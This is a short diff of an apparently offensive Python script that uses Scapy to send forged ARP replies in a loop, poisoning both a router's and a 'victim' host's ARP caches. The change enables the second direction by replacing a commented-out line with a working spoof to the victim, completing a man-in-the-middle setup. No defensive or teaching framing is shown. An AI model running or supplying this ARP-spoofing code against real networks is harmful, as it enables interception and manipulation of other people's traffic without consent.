@@ -33,7 +33,7 @@ print ("Router ip: ", ip[router],"    Router mac: ", mac[router])
 try:
     while True:
         torouter = srp((Ether(dst=mac[router])/ARP(op = 2,pdst=ip[router], psrc=ip[victim])), timeout=3, verbose=0)
-        #tovictim = srp(ARP(op = 2,psrc=(ip[router]), pdst=(ip[victim]),hwdst=(mac[victim])), verbose=True)
+        tovictim = srp((Ether(dst=mac[victim])/ARP(op = 2,pdst=ip[victim], psrc=ip[router])), timeout=3, verbose=0)
 except KeyboardInterrupt:
     pass
 
